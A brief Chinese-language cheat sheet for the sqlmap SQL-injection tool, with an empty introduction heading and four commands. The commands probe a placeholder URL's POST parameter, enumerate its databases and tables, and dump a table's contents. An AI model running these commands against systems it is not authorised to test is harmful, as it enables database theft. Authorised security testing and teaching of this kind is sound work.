## sqlmap 介绍

## sqlmap 常用命令

```
$ sqlmap -u url --data="id=admin"
# 查看数据库列表
$ sqlmap -u url --data="id=admin" --dbs
# 显示某个数据库中的表清单
$ sqlmap -u url --data="id=admin" -D database --tables
# 获取指定 database 指定 table 中的内容
$ sqlmap -u url --data="id=admin" -D database -T tablename --dump
```